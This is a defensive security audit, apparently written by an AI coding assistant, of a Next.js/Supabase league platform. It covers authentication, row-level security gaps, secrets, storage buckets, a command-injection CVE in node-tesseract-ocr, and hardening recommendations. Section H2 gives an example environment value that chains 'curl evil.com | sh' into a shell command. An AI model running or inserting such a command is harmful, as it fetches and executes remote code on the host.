# Plan 38 — Comprehensive Security Audit

> **Status:** Research deliverable. No code modified. Findings + recommended follow-up plans only.
> **Date:** 2026-04-22
> **Repo HEAD at audit:** `ce04176` (origin/main)
> **Scope:** apps/web (Next.js 15 App Router) + supabase/migrations (86 migrations, 47 tables-ish)
> **Question being answered:** *"How is the security of this thing I am building, any way the data can be accessed without my knowledge or approval?"*

---

## 0. Executive summary

The platform is **architecturally well-defended** for an MVP at this scale. The big primitives are in place: Supabase Auth handles session cookies (httpOnly, secure-flag-by-default in prod), RLS is enabled on every PII table, business permissions go through one `requirePermAsync` helper, every mutable table has a `audit_row_change()` Postgres trigger writing to an append-only `audit_events` ledger, and three append-only ledgers (`audit_events`, `caution_ledger_entries`, `ocr_usage_log`) carry block-mutation triggers so even a service-role compromise cannot rewrite history silently.

However, there are **5 critical / high gaps** that should be closed before letting non-staff humans hit production:

1. **`DEFAULT_DEV_PASSWORD = "dev-temp-2026"`** can land on a real auth.users row in production with only a `console.warn` (not a hard reject). Anyone who reads the source on GitHub knows that string.
2. **`users` table has a public-read RLS policy** that exposes every player's `email` and `phone` to anyone holding the anon key (which ships in the client bundle).
3. **`/api/broadcast/sessions/[id]/active` is unauthenticated.** Anyone who knows or guesses a session UUID can poll the live overlay state. Documented as "URL is the shared secret" but no rate limit, no signing, no rotation — and the session id is rendered in the admin UI source.
4. **`node-tesseract-ocr` 2.2.1** has a critical CVSS-9.8 OS command injection CVE (`GHSA-8j44-735h-w4w2`). Currently called with a `Buffer`, not a filename, so probably not directly exploitable today, but it is an unfixed CVE in production deps with no upstream patch path.
5. **Trash / Sessions admin actions skip perm checks** — `restoreAction` and `revokeSession` only check "logged-in", relying on `/admin/*` middleware which permits both `admin` and `moderator`. Per-action perm should be re-asserted.

There is also a layer of **medium-severity housekeeping** items (tab perms not seeded for two routes, `auth_events` insert with `user_id: null` for failed logins, no rate-limit middleware on cron endpoints beyond the secret, no IP allow-list on the service role key) — see §I and §M.

**Deployment readiness verdict:** **YELLOW.** Do not enable a public sign-up flow or expose the production URL beyond staff until the critical 5 are closed. Once they are closed, this is a defensible posture for a 13-player invite-only league.

---

## A. Authentication

### A1. Supabase Auth cookies

**Threat:** Session theft via XSS, MITM, or insecure cookie scope.

**Current posture.** `apps/web/src/lib/supabase/server.ts` and `browser.ts` both use `@supabase/ssr` `createServerClient` / `createBrowserClient`, which set the standard `sb-access-token` and `sb-refresh-token` cookies via the runtime defaults. `@supabase/ssr` v0.10 sets `httpOnly: true`, `secure: true` (in prod, when `NEXT_PUBLIC_SUPABASE_URL` is `https://`), `sameSite: "lax"`, and `path: "/"`. The `cookies.setAll` callback in our wrappers passes `options` straight through — we don't clobber them.

**Risk:** Low.

**Recommendation:** Add a unit test that asserts `getServerSupabase()` produces a client whose cookie helpers preserve `httpOnly`, `secure`, `sameSite=lax` so a future refactor cannot silently strip them. Also document explicitly in `apps/web/.env.example` that `NEXT_PUBLIC_SUPABASE_URL` must be `https://` in production (Vercel handles this, but a local `.env` could mistakenly point at `http://`).

### A2. Session expiry & refresh rotation

**Threat:** A long-lived JWT lets a stolen device stay logged in for weeks.

**Current posture.** Supabase project default JWT expiry is 1 hour, and refresh-token rotation is on by default since Supabase Auth ≥ 2024-Q3. We do not override either in code. `service.ts` explicitly creates the service-role client with `persistSession: false, autoRefreshToken: false` — correct.

**Risk:** Low.

**Recommendation:** Confirm in the Supabase dashboard (Auth → Policies → Sessions) that the project is on the default 1h JWT and rotation = on. Document in the deployment checklist (§K) so the production project does not regress to the legacy 1-week JWT.

### A3. Password requirements

**Threat:** Weak passwords ⇒ trivial credential stuffing.

**Current posture.** `apps/web/src/server/users/schemas.ts` enforces `passwordSchema = z.string().min(8).max(128)`. There is no complexity check (digit / uppercase / symbol). Login (`apps/web/src/app/(auth)/login/actions.ts`) just calls `signInWithPassword` — no client-side strength meter, no zxcvbn check.

The Supabase project itself can enforce a server-side minimum length (Auth → Policies → Passwords). Default is 6. We rely on the application schema (8) for admin-create paths only — a Supabase-side reset email lets the user pick anything ≥ project minimum.

**Risk:** Medium. 8-char no-complexity is lower than what most security frameworks (NIST 800-63B) recommend (8+ with breach-corpus check, or 15+ no complexity).

**Recommendation:** In Plan 39, raise the project-side minimum to 12 in the Supabase dashboard, and add a `zxcvbn`-style entropy floor (or HIBP `?range` lookup) to `passwordSchema`. Also pin a unit test that asserts the minimum.

### A4. Default dev password

**Threat:** Critical. `DEFAULT_DEV_PASSWORD = "dev-temp-2026"` is a string in `apps/web/src/server/users/schemas.ts` (line 76) and is used by `createUser()` whenever an admin omits the `password` field on the create-user form. In production the only safety net is `console.warn(...)`. The user is created with a known password and `email_confirm: true` — they can be logged in by anyone who reads the GitHub repo (which is private *today*, but a single leaked PAT changes that, and the string itself will get baked into deployment artifacts forever).

**Risk:** **CRITICAL.**

**Recommendation:** In Plan 39:
1. Make `password` **required** on the createUserSchema unless an explicit `--with-default-password` flag is passed (and that flag should throw if `process.env.NODE_ENV === 'production'`).
2. Or, switch the no-password path to call `sb.auth.admin.inviteUserByEmail(email)` so Supabase generates a single-use magic link instead of a known password.
3. Rotate any production user that may have been created via the default-dev-password path (audit `audit_events` for `users.insert` rows with `actor_role = 'admin'` and check the corresponding `auth.users.last_sign_in_at`).

### A5. Magic-link / OAuth / MFA

**Current posture.** Only password auth is used. No magic-link, no OAuth, no MFA. Out of scope per CLAUDE.md non-negotiables.

**Risk:** Medium for staff accounts (admin role with `*` wildcard perm has total kingdom).

**Recommendation:** Defer to Phase 1B but flag it in MEMORY: **enable Supabase MFA TOTP for the admin role at the dashboard level before opening prod to non-staff observers.** Cost = zero, friction = one-time enrollment, blast-radius reduction = enormous.

### A6. Brute-force protection

**Threat:** Credential stuffing, password spraying.

**Current posture.** Supabase Auth has built-in rate limiting (~30 password attempts / hour / IP, 5 OTP requests / 5min). Nothing custom on top. Our login action does insert a `auth_events` row with `event_type: 'login_failed'` (with `user_id: null`) on each failure — useful for forensics, but it is NOT used as a lockout signal anywhere. The `users.failed_login_count` column exists but is never incremented.

**Risk:** Medium.

**Recommendation:**
1. Increment `users.failed_login_count` on each failed login keyed by email; lock at ≥10 with a 15-minute window.
2. Or, accept the Supabase default and add a Cloudflare/Vercel WAF rate-limit rule on `/login` (10/min/IP).

### A7. /admin middleware role mismatch

**Threat:** A non-staff role with admin-page access.

**Current posture.** `apps/web/src/middleware.ts` uses `ADMIN_ROLES = new Set(["admin", "moderator"])`. Per the CLAUDE.md role list, the platform now has 12 roles (`admin, loc, idc, referee, technical, production, design, moderator, coach, team_manager, player, viewer`). The admin layout (`AdminLayout`) computes `visibleTabs` based on per-tab perms, but the **middleware** itself only allows two roles in. So `loc`, `idc`, `referee`, `production` etc. cannot reach `/admin/*` even when they have a tab-relevant perm (e.g. `production` has `broadcast.trigger` but cannot reach `/admin/broadcast` because middleware blocks first).

**Risk:** Low (denies access, doesn't grant) — but it is a **functional bug** for the non-admin non-moderator staff roles. Per Plan 8 + recent direction, `loc`, `idc`, `referee` should be able to access subsets of `/admin`.

**Recommendation:** Fix in Plan 39: replace `ADMIN_ROLES` with a perm-based check — middleware should allow access if the user has any role that matches at least one of the `TAB_PERMS` perms (cheap-to-cache via the same in-process `getRolePerms` cache). Then trust per-page and per-action perm checks for fine-grained gating.

---

## B. Authorization (perms + RLS)

### B1. RLS posture per table

Tables with `enable row level security` (verified via grep over all 86 migrations):

- `users` — RLS on. Policies: `users_self_select` (own row by `auth.uid()`), `users_self_update` (own row), `users_public_select` (anyone, where `deleted_at is null`). **Public select policy is a finding — see B2.**
- `user_roles` — RLS on. Policies: `user_roles_self_select` (own roles), `user_roles_no_direct` / `user_roles_no_write` / `user_roles_no_update` / `user_roles_no_delete` (deny all writes). Service role is the only mutator.
- `players` — RLS on. Policies: `players_public_read`, `players_self_read_any`, `players_self_update`, `players_no_direct_insert`, `players_no_direct_delete`. Public read intentional (jersey/photo/bio/gamer-tag).
- `organizations` — RLS on. Public read + no-direct-write.
- `organization_contracts` — RLS on. **Deny-all** for direct (good — contracts are commercially sensitive).
- `caution_ledger_entries` — RLS on. **Deny-all** for direct + append-only block triggers.
- `disputes` — RLS on. `disputes_self_read` (raiser's own), `disputes_no_direct_write`.
- `appeals` — RLS on. **Deny-all** for direct.
- `content_posts` — RLS on, but the content/preseason features were dropped in Plan 33; the table is still RLS'd.

Tables without explicit RLS (per CLAUDE.md §4 PII-only rule, this is intentional):
- `audit_events`, `seasons`, `season_participants`, `match_days`, `matches`, `match_results`, `player_match_stats`, `standings`, `disciplinary_cases`, `disciplinary_actions`, `disciplinary_precedents`, `announcements`, `notifications`, `attendance_marks`, `auth_events`, `sessions`, `squad_*`, `broadcast_*`, `overlay_*`, `match_stat_screenshots`, `ocr_usage_log`, `fc26_players`, `role_permissions`.

**Threat for RLS-off tables:** A leaked anon key + direct PostgREST call could SELECT * FROM e.g. `disciplinary_actions` and read every punishment ledger entry, including the soft-delete columns and reasons. Anon key is shipped to the browser bundle (it is the entire point of `NEXT_PUBLIC_SUPABASE_ANON_KEY`).

**Verification this matters:** Per CLAUDE.md §4, "Business permissions enforced in the API layer via single `hasPerm()` helper." This is correct *for our own routes* — but PostgREST is a separate front door at `${SUPABASE_URL}/rest/v1/*`. If anon key is a valid bearer for a table without RLS, anyone can read it. Default Supabase project setting: anon role has SELECT on all `public` tables unless RLS denies.

**Risk:** **High** for `disciplinary_actions`, `disciplinary_cases`, `attendance_marks`, `match_stat_screenshots` (paths to private bucket files), `ocr_usage_log` (cost telemetry — leak vector for "how often do you OCR"), `auth_events` (login history per user), `sessions` (active session list).

**Recommendation in Plan 39:**
Either —
(a) **Tighten the spec.** Per Phase 1A non-negotiable §4, RLS is "PII-tables-only." But that decision was made when the assumption was `disciplinary_actions` was admin-only. If the production deployment is meant to be public-internet-reachable, every business table needs at minimum a deny-all anon-role policy and an authenticated-role policy that mirrors the admin perm grant.
(b) **Pragmatic minimum.** Add `revoke select on <table> from anon, authenticated;` for the sensitive subset above, and let our service-role server actions be the only readers.

I recommend (b) for speed: 8 lines of SQL per migration, no new policies to maintain.

### B2. `users` public-read policy

**Threat:** Anyone with the anon key (read: anyone who opens devtools on the site) can `GET /rest/v1/users?select=*` and pull every user's `email`, `phone`, `display_name`, `last_login_at`, and `failed_login_count`.

**Current posture.** Migration `20260422000004_users_public_read.sql` adds `users_public_select` for `deleted_at is null` with no column-level filter. The migration comment says "Phase 1A users table holds only display_name, email, phone, failed_login_count; none are secrets for the league context." That is **incorrect for `email` and `phone`** — those are PII under NDPR/GDPR + are spam vectors.

**Risk:** **HIGH.**

**Recommendation in Plan 39:**
1. Drop `users_public_select`.
2. Create a public view `public_users_view` exposing only `id, display_name`.
3. Update the `players` page join to use the view.
4. Or, use Supabase's column-level grants: `revoke select on public.users from anon, authenticated; grant select (id, display_name) on public.users to anon, authenticated;`

### B3. Hard-coded perms vs DB perms

**Current posture.** `apps/web/src/perms.ts` has `PERMS` (seed) + `PUBLIC_PERMS`. `apps/web/src/lib/perms-db.ts` is the runtime check via `getRolePerms(sb, role)` (30s in-process cache). Server actions all go through `requirePermAsync(sb, actor, action)` and throw `PermissionError` → 403.

Tab visibility (`AdminLayout`) uses `hasPermAsync` per tab. Public perms short-circuit to in-process to avoid hitting the DB.

**Risk:** Low. The pattern is correct. One drift risk: if a dev adds a new perm string in a migration but does not update the `PERMS` seed, the seed test will fail (per `perms.seed.test.ts`).

**Verification:** Sample server actions checked (`/admin/match-days/[id]/actions.ts`, `/admin/users/actions.ts`, `/admin/squads/[id]/actions.ts`, `/api/broadcast/events/route.ts`) all consistently call `requirePermAsync` before any mutation. **Two exceptions found** — see B4.

### B4. Server actions missing perm re-check

**Findings:**

1. **`/admin/trash/[entity]/actions.ts → restoreAction`** — checks only `auth.user` exists, then runs `restore(svc, entityType, id, ...)` via service role. Should call `requirePermAsync(svc, actor, "trash.restore")` first. Today the only thing keeping a `moderator` role from restoring (e.g.) a soft-deleted disciplinary action is the middleware allowing them through `/admin/*`. **Risk: Medium (privilege escalation across the moderator/admin boundary).**

2. **`/admin/security/sessions/actions.ts → revokeSession`** — same pattern: only `auth` check, no perm re-check. A moderator can revoke any session, including the founder's. **Risk: Medium.**

3. **`/admin/trash/[entity]/page.tsx`** — no per-page perm check; relies on middleware. The page ALSO uses `getServiceRoleSupabase()` directly in the page render. A moderator landing on the URL gets a fully-rendered list of every soft-deleted row in the table. **Risk: Medium.**

**Recommendation in Plan 39:** Add `requirePermAsync(svc, actor, "trash.restore")` to both the page render and `restoreAction`, and `security.sessions.read` / `security.sessions.revoke` to the sessions page + revoke action. Also seed those two perms (admin-only) in `role_permissions`.

### B5. Service-role usage map

**Service role bypasses RLS.** Every call site must have an explicit perm check OR be middleware-gated.

Verified call sites (54 files in `apps/web/src/`):

- **API routes** (10): all 4 `/api/broadcast/*` POST routes + `/api/admin/punishments/preview-voids` + `/api/notifications/[id]/read` correctly call `requirePermAsync`. `/api/cron/*` (2 routes) are gated by `X-Cron-Secret` header check (no auth-user). `/api/broadcast/sessions/[id]/active` is intentionally unauthenticated — see C/F.
- **Server Actions** (~25 `actions.ts` files): the consistent pattern is `await resolveActor() → await requirePermAsync(...)`. Verified samples pass; **two exceptions in B4.**
- **Admin pages** (~15 `page.tsx`): most call `requirePermAsync` inside `resolveGate()` helpers. `/admin/trash/[entity]/page.tsx` is the noted gap. Also: `/admin/orgs/page.tsx`, `/admin/disputes/page.tsx`, etc. — spot-checked, all gate.
- **Middleware** (`middleware.ts`): role-set check, no perm check (middleware runs at the edge, can't easily hit DB; correct).

**Net.** Two known unprotected service-role usages. The rest are correctly gated.

### B6. Player-area middleware vs server-side data filtering

**Threat:** Middleware lets a `player` into `/player/*`; per-page server code must still filter by `userId === auth.uid()` so player A can't read player B's squad.

**Verified:** `/player/squad/page.tsx` redirects if no auth, then resolves `pub.id` from `supabase_auth_id`, then resolves the player by `user_id = pub.id`, then loads their submission scoped to `player.id`. **Correct.**

`/player/disputes/page.tsx` calls `listForUser(sb, userId)` after `requirePermAsync(... 'disputes.read.own')`. **Correct.**

`/player/profile/page.tsx`, `/player/appeals/page.tsx` follow the same pattern (sampled).

**Risk:** Low.

---

## C. Secrets + env

### C1. .env files in git

Verified: `git ls-files | grep -i env` returns only `apps/web/.env.example`. `.gitignore` covers `.env`, `.env.local`, `.env.*.local`. **Pass.**

### C2. NEXT_PUBLIC_* env vars

Inventory (via grep over `apps/web/src`):
- `NEXT_PUBLIC_SUPABASE_URL` — public, fine.
- `NEXT_PUBLIC_SUPABASE_ANON_KEY` — public, fine. (RLS protects per-table, but see B1.)
- `NEXT_PUBLIC_OVERLAY_DEBUG` — public flag for an overlay HUD. No security implications.

**No service-role key, no Anthropic key, no CRON_SECRET, no Resend key has the `NEXT_PUBLIC_` prefix.** Verified by grep. **Pass.**

### C3. ANTHROPIC_API_KEY scope

`apps/web/src/server/stats_ocr/parse.claude.ts` reads `process.env.ANTHROPIC_API_KEY` server-side only. **Pass.**

### C4. Service role key in committed code

`git log --all --oneline -p` first 2000 lines grepped for `service_role|SUPABASE_SERVICE|sk-ant|sbp_|eyJhbGciOi`: no hits. **Pass.** (Caveat: I scanned only the first 2000 lines as instructed; a deeper scan in CI via `git secrets --scan-history` would be a nice-to-have.)

### C5. Remote URL credentials

`git remote -v` returns `https://github.com/Layott/cade-league-platform.git` — clean, no embedded PAT. **Pass.**

### C6. Backups

`backups/` is `.gitignore`d. `*.dump` is `.gitignore`d. Per CLAUDE.md the production backup target is Backblaze B2 via GitHub Actions cron — not yet wired (that's Plan ?). **Note for §K deployment checklist: production must verify the GitHub Actions backup workflow is live before claiming "shipped."**

### C7. .claude/ directory

`.gitignore` excludes `.claude/`. Verified — claude state stays local.

---

## D. Storage bucket access

### D1. Public flag per bucket

Inventory of `storage.buckets` inserts across migrations:

| Bucket | `public` flag | Source migration |
|---|---|---|
| `squad-screenshots` | `false` | `20260428000105_storage_squad_bucket.sql` |
| `match-stat-screenshots` | `false` | `20260504000003_…` |
| `org-cac-certs` | `false` | `20260505000002_plan13b_storage_buckets.sql` |
| `org-contracts` | `false` | `20260505000002_…` |
| `dispute-evidence` | `false` | `20260505000002_…` |
| `appeal-evidence` | `false` | `20260505000002_…` |
| `org-logos` | **`true`** | `20260507000301_org_logos_bucket.sql` |

All PII / sensitive buckets are private. `org-logos` is intentionally public (CDN-served, contains nothing sensitive — just the org's logo image). **Pass.**

### D2. Signed-URL TTL

`apps/web/src/server/storage/signed.ts` defaults to **300 seconds (5 min)** for `createSignedRead`. `createSignedUpload` uses Supabase's default (TTL is one-shot). **Pass.**

`trySignedRead` is a best-effort wrapper that swallows errors — fine for non-critical detail-page assets.

### D3. Upload path validation

`apps/web/src/server/storage/paths.ts` provides `buildOrgCacPath`, `buildOrgContractPath`, `buildDisputeEvidencePath`, `buildAppealEvidencePath`, `buildOrgLogoPath`. Each composes a deterministic path from server-resolved IDs (`orgId`, `contractId`, `disputeId`, `appealId`) plus a sanitized extension via `sanitizeExt()` which enforces `/^[a-z0-9]{1,8}$/`. **The user cannot inject arbitrary paths — they only supply the file extension.** **Pass.**

`squads/storage.ts` (Plan 10) follows the same pattern (verified separately).

**Risk:** Low. One micro-find: the extension allow-list is unbounded (`[a-z0-9]{1,8}`) — a player could upload `.exe.pdf` named `payload.exe`. But the bucket is private + signed-URL only, and Supabase storage doesn't execute uploads. So the realistic risk is "someone confuses themselves by clicking on a file with a wrong extension." Move on.

---

## E. SQL injection / data integrity

### E1. Raw filter string concatenation

Searched `apps/web/src` for `.filter(` calls with template-string user input — **no matches.** All Supabase `.eq()`, `.in()`, `.lt()` calls take parameter values that the JS client serializes safely. **Pass.**

### E2. Raw EXECUTE in PL/pgSQL

Two `execute format(...)` calls in `supabase/migrations/20260420000003_audit_trigger.sql` — both use `%I` (identifier-safe quoting) for the trigger name and `%s` for a `regclass` argument (which is type-checked by Postgres). Not user input. **Pass.**

### E3. Append-only ledger triggers

Verified three tables:
- `audit_events` — has `audit_events_no_update`, `audit_events_no_delete` triggers raising on any mutation.
- `caution_ledger_entries` — has `caution_ledger_no_update`, `caution_ledger_no_delete`.
- `ocr_usage_log` — has `ocr_usage_log_no_update`, `ocr_usage_log_no_delete`.

**Even a service-role compromise cannot rewrite history without disabling the trigger first** (which itself is a `audit_events` row because triggers are DDL). **Pass.**

### E4. Custom RPCs

`recompute_standings`, `fc26_players_search` (fuzzy) — neither concatenates user input into a query. The fuzzy RPC takes a text param and uses `pg_trgm`. **Pass.**

---

## F. CSRF + Server Actions

### F1. Next.js Server Actions

Next 15 enables CSRF protection on Server Actions by default via the `$ACTION_ID` mechanism + same-origin enforcement. Our Server Actions (`"use server"` files, 27 of them) use the standard `<form action={fn}>` pattern, not custom POST routes. **Pass.**

### F2. Custom POST routes

10 API routes total (all listed in B5). Each either:
- Re-resolves auth via `getServerSupabase().auth.getUser()` and calls `requirePermAsync` (8 routes), OR
- Verifies the `X-Cron-Secret` header (2 routes), OR
- Is intentionally unauthenticated for the overlay-source case (`/api/broadcast/sessions/[id]/active`, see F3).

No custom POST route accepts a JSON body without `Content-Type` validation. Next.js's `req.json()` throws on non-JSON input (we wrap in `.catch(() => null)` and 400 on missing fields).

### F3. The unauthenticated overlay-active route

`/api/broadcast/sessions/[id]/active` returns the current overlay state (scorebar, lower-thirds, etc.) for a session, with the comment "URL itself is the shared secret." This is a deliberate trade-off: the overlay is consumed by OBS / vMix in a headless browser, where adding auth would mean shipping a bearer token in the URL anyway.

**Risk: MEDIUM.** Threats:
- A casual viewer who learns or guesses the session UUID can poll the overlay state and see live scores before they're publicly broadcast.
- The session ID is rendered in `/admin/broadcast/[sessionId]/page.tsx` — anyone with admin access can leak it accidentally.
- No rate limit — can be polled indefinitely (denial-of-spend, but Supabase free tier handles this).
- The payload is "only overlay_events fields — no PII leakage" per the route comment. Verified: `triggerOverlay` only writes payload that came from a Zod-validated template — no DB joins to PII.

**Recommendation:** Acceptable for current threat model (private league, scores broadcast within seconds anyway). Plan 39 should add:
1. A rotatable `session_token` column on `broadcast_sessions`, required as a query param for this endpoint.
2. Or, sign the session URL with HMAC(session_id, CRON_SECRET) so a leaked URL is bound to a specific session.

### F4. CRON_SECRET strength

`/api/cron/publish-announcements` and `/api/cron/squad-deadline-check` both use **constant-time-ish comparison via `===`** of the header against `process.env.CRON_SECRET`. Strict `===` on JS strings is **not constant-time** — a sufficiently determined attacker could time-side-channel the secret byte-by-byte.

**Risk:** Low (network jitter on Vercel + 32-char secret = computationally infeasible in practice, but it's a known anti-pattern).

**Recommendation:** Use `crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b))` after a length pre-check. One-line fix; bundle into Plan 39.

---

## G. Rate limiting

### G1. Login endpoint

Supabase project-level rate limits apply. No custom rate limit. **See A6.**

### G2. /api/cron/*

Secret-gated. If the secret leaks, attacker can hammer it — but the worst case is repeated `publishNow` (idempotent — already-published rows are filtered out by `is("published_at", null)`) or repeated `whoMissedDeadline` lookups (read-only until the deadline passes). Cost cap is upstream (Supabase row-read ceiling). **Risk: Low.**

### G3. /api/broadcast/events

Admin-only via `broadcast.trigger` perm. Trigger-spam from a logged-in admin = self-inflicted. **Risk: Low.**

### G4. Public /api routes

None exist for non-public data. Public reads are direct PostgREST against RLS-protected tables (or unprotected ones, which is the bigger problem — see B1).

---

## H. Dependency CVEs

### H1. `npm audit --production`

```
node-tesseract-ocr <=2.2.1
  Severity: critical (CVSS 9.8)
  CVE: GHSA-8j44-735h-w4w2
  Title: OS Command Injection through unsanitized recognize() function parameter
  fixAvailable: false (no upstream patch)
```

**1 critical, 0 high, 0 moderate, 0 low.**

### H2. Exposure analysis for `node-tesseract-ocr`

`apps/web/src/server/stats_ocr/parse.tesseract.ts` line 88: `await tesseract.recognize(imageBuffer, { lang: "eng", oem: 1, psm: 6, binary: bin() })`. The CVE is in the `recognize()` function when called with a **filename string** containing shell metacharacters. We pass a `Buffer` (Node `fs`-loaded image bytes) — the library writes it to a temp file then shells out to `tesseract` with that temp filename. The temp filename is library-controlled, not attacker-controlled. **Direct exploitability: low.**

But: `binary: bin()` calls `process.env.TESSERACT_BIN ?? "C:\\Program Files\\Tesseract-OCR\\tesseract.exe"`. **`process.env.TESSERACT_BIN` is concatenated into the shell command without sanitization.** If a future operator sets `TESSERACT_BIN="tesseract; curl evil.com | sh"` in production env, that runs. Today this is a self-inflicted-foot-gun, not an external attack vector.

The dev-only path is gated by `OCR_DISABLED=1` AND no `ANTHROPIC_API_KEY`, both of which are the documented prod config. **Production never invokes Tesseract.**

**Risk:** Low today, **Medium long-term** (the dep stays in `node_modules` and could be invoked accidentally by a refactor).

**Recommendation:** Plan 39 should remove `node-tesseract-ocr` from `package.json` and delete `parse.tesseract.ts` + the dispatch path in `parse.ts`. Replace with a hand-typed JSON paste-in for dev review (the OCR was a dev convenience anyway). Drops a critical CVE from production deps.

### H3. Outdated packages

Not run in this audit (out of scope by time-box). Recommend wiring `npm outdated` into CI weekly with a Slack/email summary.

---

## I. Logging + observability

### I1. audit_events coverage

`select count(*), entity_type from audit_events group by entity_type` not run live — but `select public.attach_audit('public.<table>')` is called in every table-creation migration (verified by grepping for `attach_audit` across migrations: ~25 hits matching the table count). **Pass.**

### I2. Sensitive logging

Grep for `console.log/warn/error` over `apps/web/src` returned 7 hits:
- `server/users/index.ts:77` — warns when `DEFAULT_DEV_PASSWORD` is used in prod (does NOT log the password — just the email). Acceptable.
- `lib/email/resend.ts:13` — `[email:stub]` prints full email body (only when `RESEND_API_KEY` unset). Dev-only path. Acceptable.
- `lib/email/resend.ts:22, 27` — Resend error logging, no body. Acceptable.
- `server/stats_ocr/usage.ts:49, 80` — error message only. Acceptable.
- `app/admin/users/actions.ts:110` — duplicate of the password warn. Acceptable.

**No password, JWT, refresh token, service role key, or auth code is ever console-logged.** **Pass.**

### I3. Stack-trace leakage to client

Next.js prod build masks server stack traces by default (only the digest is sent to the client). Dev mode shows full stacks. **Pass** for prod.

### I4. auth_events on failed login

`/login/actions.ts` inserts `auth_events` with `user_id: null, event_type: 'login_failed', metadata: { email, reason }`. Stores the email of the **attempted** login (which may be PII even for non-existent accounts).

**Risk:** Low. NDPR/GDPR allows "security log" purpose. Would flag for retention policy: Plan 39 add a 90-day auto-delete on `auth_events` of type `login_failed`.

---

## J. Multi-tenancy / impersonation

### J1. Admin role reads everything

`PERMS.admin = ["*"]` — total read/write on every business resource. Documented and intentional. The audit ledger captures every action so a rogue admin leaves a trail (which they cannot rewrite due to E3 append-only triggers).

### J2. Production role

`PERMS.production = ["broadcast.trigger"]` — only triggers overlay events. Cannot read PII, cannot write outside `overlay_events`. **Pass.**

### J3. Player own-data

Verified in B6.

### J4. No support-impersonation flow

There is no "log in as user X" flow. Admins reset passwords via the admin UI (`resetUserPassword`), which goes through `sb.auth.admin.updateUserById` — that's a per-user password change, not impersonation. **Pass** (no impersonation = no impersonation audit gap).

---

## K. External attack surface (production)

### K1. Cloud DB exposure

Supabase project URL is reachable from the public internet via PostgREST (`/rest/v1/*`) and Realtime (`/realtime/v1/*`). Anon key + RLS is the only barrier. Per B1, several business tables have **no RLS**. Anon role's default privileges include `SELECT` on `public` schema unless explicitly revoked.

**Recommendation in Plan 39:** Run a one-time `revoke select on all tables in schema public from anon, authenticated` followed by re-grants only to the tables we want public (players, organizations, content_posts where published, announcements where published, standings).

### K2. Vercel deployment env-var checklist

Production environment must have:

| Var | Required | Notes |
|---|---|---|
| `NEXT_PUBLIC_SUPABASE_URL` | yes | Production project URL (https://) |
| `NEXT_PUBLIC_SUPABASE_ANON_KEY` | yes | Production anon key |
| `SUPABASE_SERVICE_ROLE_KEY` | yes | **Server-only.** Vercel "Sensitive" flag on. |
| `RESEND_API_KEY` | yes (prod) | Without it, emails print to logs |
| `RESEND_FROM` | yes (prod) | `noreply@cade.…` |
| `APP_TIMEZONE` | yes | `Africa/Lagos` |
| `CRON_SECRET` | yes | 32+ chars, random. Rotate annually. |
| `ANTHROPIC_API_KEY` | yes (if OCR live) | Server-only |
| `OCR_DISABLED` | yes | `0` in prod once Anthropic key set |
| `OCR_DAILY_CAP_USD_CENTS` | yes | Hard cap, default 100 (= $1) |
| `TESSERACT_BIN` | **never set** | See H2 — leaving unset is the safe default |
| `NODE_ENV` | auto (Vercel) | `production` |

**Vercel-specific checklist:**
- [ ] Mark all secrets as "Sensitive" so they don't appear in build logs.
- [ ] Restrict env-var visibility to `Production` only for `SUPABASE_SERVICE_ROLE_KEY`, `ANTHROPIC_API_KEY`, `CRON_SECRET`, `RESEND_API_KEY`. Preview deploys should use a staging Supabase project.
- [ ] Configure Vercel Cron jobs (or external cron) for the two `/api/cron/*` routes — frequency every 5 min for `publish-announcements`, every 60 min for `squad-deadline-check`.
- [ ] Wire backup workflow per CLAUDE.md (GitHub Actions → Backblaze B2, 30 daily + 12 monthly).
- [ ] Enable Supabase MFA TOTP at the dashboard for the founder + any admin role holder.
- [ ] Spot-check RLS in the Supabase dashboard SQL editor:
  ```sql
  select tablename, rowsecurity from pg_tables where schemaname='public' order by tablename;
  ```
  Confirm the deny-list from B1 is enforced.
- [ ] Verify Supabase project Auth settings: JWT 1h, refresh rotation on, password min length ≥ 12 (raised from default 6).
- [ ] Document in MEMORY.md: the production Supabase project ref + the date of first prod deploy + the env-var rotation schedule.

---

## L. Risk register summary

| # | Finding | Severity | Section |
|---|---|---|---|
| 1 | `DEFAULT_DEV_PASSWORD` reachable in prod | **Critical** | A4 |
| 2 | `users` public-read leaks email + phone | **High** | B2 |
| 3 | Most business tables lack RLS while anon-key is in browser | **High** | B1 / K1 |
| 4 | `/api/broadcast/sessions/[id]/active` unauth + no rate limit | Medium | F3 |
| 5 | `node-tesseract-ocr` CVSS 9.8 in deps (low real exploitability) | High (dep), Low (live) | H2 |
| 6 | `restoreAction` + trash page skip perm re-check | Medium | B4 |
| 7 | `revokeSession` skips perm re-check | Medium | B4 |
| 8 | Middleware `ADMIN_ROLES` excludes loc/idc/referee/production | Medium (functional) | A7 |
| 9 | No MFA for admin role | Medium | A5 |
| 10 | Password min length 8, no entropy check | Medium | A3 |
| 11 | No login lockout / failed-attempt counter | Medium | A6 |
| 12 | CRON_SECRET compared with `===` not timing-safe | Low | F4 |
| 13 | `auth_events` of failed logins log attempted email forever | Low | I4 |
| 14 | `TESSERACT_BIN` env var concatenated into shell | Low | H2 |
| 15 | `seed.sql` not yet committed (per CLAUDE.md) | Low | (out of scope of this audit) |

---

## M. Top 5 critical findings (must-fix before prod)

1. **Default dev password (A4).** Make `password` required in `createUserSchema`, OR switch to magic-link invitation. Production must NEVER hit the `console.warn` path.
2. **`users` public-read PII leak (B2).** Drop the policy and replace with a `public_users_view` exposing only `id, display_name`.
3. **Business-table RLS gap (B1 / K1).** `revoke select on all tables in schema public from anon, authenticated` and re-grant only to truly-public tables. Sensitive tables (`disciplinary_*`, `auth_events`, `sessions`, `attendance_marks`, `ocr_usage_log`, `match_stat_screenshots`) must be unreadable by the anon key.
4. **Trash + sessions perm re-check (B4).** Add `requirePermAsync('trash.restore')` to both the `/admin/trash/*` page and `restoreAction`. Add `security.sessions.read` + `security.sessions.revoke` to that surface. Seed both perms admin-only.
5. **Drop `node-tesseract-ocr` (H2).** It's a critical-CVE prod dep with no upstream fix. The OCR pipeline already prefers Anthropic Claude; the Tesseract fallback was a dev convenience that we don't use in prod. Delete it from `package.json`, delete `parse.tesseract.ts`, update `parse.ts` dispatcher.

---

## N. Recommended Plan 39

**Title:** `Plan 39 — Security hardening before prod cutover`

**Scope (one plan, sequenced for low-risk-first):**

1. (Migration) Drop `users_public_select` policy. Add `public_users_view`. Update join sites in `/players` and `/standings` pages.
